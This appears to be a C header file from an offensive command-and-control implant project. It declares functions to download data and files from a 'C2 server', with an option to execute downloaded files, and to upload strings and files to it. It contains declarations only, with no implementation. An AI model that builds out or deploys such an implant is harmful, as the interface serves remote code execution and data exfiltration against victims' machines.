#ifndef NETWORK_UTILS_H
#define NETWORK_UTILS_H

#include "../include/system_utils.h"

#define EXIT_COMMAND "exit\n"

struct sockaddr_in;

/**
 * C2 downloader
 *
 * It downloads data from C2 server web
 *
 * ip_addr - String with ip address of the listener
 * response - String with the answer from the server
 *
 * Returns - OK or ERROR
*/
int download_data(char *ip_addr, char **response);

/**
 * C2 downloader
 *
 * It downloads files from C2 server web
 *
 * ip_addr - String with ip address of the listener
 *
 * Returns - OK or ERROR
*/
int download_file(char *ip_addr, int execute);

/**
 * C2 uploader
 *
 * It uploads strings to C2 server web
 *
 * ip_addr - String with ip address of the listener
 * data - String to send to the server
 *
 * Returns - OK or ERROR
*/
int upload_data(char *ip_addr, char *data);

/**
 * C2 uploader
 *
 * It uploads files to C2 server web
 *
 * ip_addr - String with ip address of the listener
 * data - File to send to the server
 *
 * Returns - OK or ERROR
*/
int upload_file(char *ip_addr, FILE *data);

#endif